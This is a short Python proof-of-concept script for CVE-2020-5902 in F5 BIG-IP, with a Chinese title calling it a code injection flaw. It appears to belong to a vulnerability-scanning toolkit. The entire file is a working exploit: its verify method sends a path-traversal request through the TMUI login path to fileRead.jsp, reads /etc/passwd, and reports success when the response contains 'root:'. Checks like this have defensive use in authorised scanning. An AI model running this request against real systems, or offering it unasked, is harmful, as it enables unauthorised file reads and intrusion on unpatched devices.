# title: F5 BIG-IP 代码注入漏洞
# author: jgz
# cve-id: CVE-2020-5902

from poctools import BasicPoc


class F5BigIpPoc(BasicPoc):
    def __init__(self):
        super(F5BigIpPoc, self).__init__()
        self.name = "F5 BIG-IP 代码注入漏洞"
        self.headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 Aoyou/biEzMm5kNDRrWTcgazFsTEFTYejkYHK-l5UHLC1JPOhy_B1sefJvAsiTZA=='}
        self.timeout = 10

    def verify(self, url: str) -> bool:
        url = url.strip("/")
        target = f'{url}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd'
        try:
            resp = self.get(target, headers=self.headers, timeout=self.timeout, verify=False)
            if resp.status_code == 200 and "root:" in resp.text:
                return True
            else:
                return False
        except Exception as e:
            pass
        return False


if __name__ == '__main__':
    url = "https://127.0.0.1/"
    poc = F5BigIpPoc()
    result = poc.run(url)
    print(f"{url} -> {result}")